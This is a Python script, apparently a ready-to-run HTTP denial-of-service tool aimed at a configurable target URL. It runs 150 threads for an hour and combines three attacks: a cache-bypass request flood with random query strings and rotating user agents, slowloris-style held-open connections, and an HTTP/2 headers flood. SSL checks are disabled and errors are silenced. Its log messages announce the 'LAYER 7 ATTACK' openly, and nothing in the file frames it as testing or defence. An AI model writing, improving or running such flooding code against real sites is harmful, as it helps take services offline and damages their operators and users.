import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor
import requests
from fake_useragent import UserAgent
from urllib3.exceptions import InsecureRequestWarning

# --- DISABLE SSL WARNINGS (for raw speed) ---
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- CONFIG ---
TARGET_URL = "https://example.com"  # REPLACE WITH YOUR TARGET
THREAD_COUNT = 150  # Adjust based on system capacity
REQUEST_DELAY = 0.001  # Ultra-low delay for flood, with jitter added in code
RUN_TIME = 3600  # Duration of attack in seconds

# --- USER AGENTS & HEADERS ---
ua = UserAgent()
headers_list = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Connection": "keep-alive"},
    {"Accept-Encoding": "gzip, deflate, br", "Cache-Control": "no-cache"},
    {"Accept-Language": "en-US,en;q=0.5", "Upgrade-Insecure-Requests": "1"}
]

# --- CACHE BYPASS PAYLOADS ---
cache_bypass_payloads = [
    "?cache_buster={random}",
    "?cb={random}",
    "?v={random}",
    "?version={random}"
]

# --- GLOBAL STOP EVENT ---
stop_event = False

# --- CACHE BYPASS FLOOD ---
def cache_bypass_flood(session):
    end_time = time.time() + RUN_TIME
    local_ua = UserAgent()
    while time.time() < end_time and not stop_event:
        try:
            payload = random.choice(cache_bypass_payloads).format(random=random.randint(1, 999999))
            url = f"{TARGET_URL}{payload}"
            headers = random.choice(headers_list).copy()
            headers["User-Agent"] = local_ua.random
            session.get(url, headers=headers, verify=False, timeout=5)
            # Uncomment below to reduce print frequency for performance
            # logging.info(f"CACHE BYPASS HIT: {url}")
        except Exception:
            pass
        time.sleep(REQUEST_DELAY + random.uniform(0, 0.005))

# --- SLOWLORIS ATTACK ---
def slowloris_attack():
    end_time = time.time() + RUN_TIME
    local_ua = UserAgent()
    session = requests.Session()
    while time.time() < end_time and not stop_event:
        try:
            slowloris_headers = {
                "User-Agent": local_ua.random,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "Keep-Alive": "900",
                "Content-Length": "1000000",
                "X-a": f"SHUTDOWN-{random.randint(1, 999999)}"
            }
            session.get(TARGET_URL, headers=slowloris_headers, stream=True, timeout=1000)
            # logging.info(f"SLOWLORIS CONNECTION OPEN: {TARGET_URL}")
            time.sleep(1000)  # Keep connection open as long as possible
        except Exception:
            pass

# --- HTTP/2 FLOOD (if supported) ---
def http2_flood():
    try:
        from h2.connection import H2Connection
        from h2.config import H2Configuration
        import socket

        end_time = time.time() + RUN_TIME
        
        while time.time() < end_time and not stop_event:
            sock = socket.create_connection((TARGET_URL.replace("https://", "").replace("http://", ""), 443), timeout=5)
            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # Send multiple headers frames until stop or end time
            stream_id = 1
            while time.time() < end_time and not stop_event:
                headers = [
                    (":authority", TARGET_URL.replace("https://", "").replace("http://", "")),
                    (":path", f"/{random.randint(1, 999999)}"),
                    (":method", "GET"),
                    (":scheme", "https"),
                ]
                conn.send_headers(stream_id, headers)
                sock.sendall(conn.data_to_send())
                time.sleep(0.1)
    except Exception:
        pass

# --- MAIN ATTACK FUNCTION ---
def start_attack():
    global stop_event
    logging.basicConfig(level=logging.INFO, format='[SHUTDOWN] %(message)s')

    logging.info(f"UNLEASHING LAYER 7 ATTACK ON {TARGET_URL}!")

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        # Divide threads roughly into 3 groups
        for _ in range(THREAD_COUNT // 3):
            session = requests.Session()
            executor.submit(cache_bypass_flood, session)
            executor.submit(slowloris_attack)
            executor.submit(http2_flood)

        try:
            # Run until RUN_TIME with periodic check for graceful stop
            run_until = time.time() + RUN_TIME
            while time.time() < run_until:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user.")
        finally:
            stop_event = True

if __name__ == "__main__":
    start_attack()
